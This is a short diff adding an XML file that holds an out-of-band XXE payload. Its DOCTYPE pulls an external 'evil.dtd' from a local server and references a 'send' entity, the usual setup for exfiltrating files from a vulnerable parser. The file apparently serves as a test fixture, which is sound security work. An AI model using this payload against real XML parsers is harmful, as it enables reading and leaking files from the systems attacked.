@@ -1,0 +1,6 @@
+<?xml version="1.0" ?>
+<!DOCTYPE data [
+  <!ENTITY % dtd SYSTEM "http://localhost:8090/evil.dtd">
+  %dtd;
+]>
+<data>&send;</data>
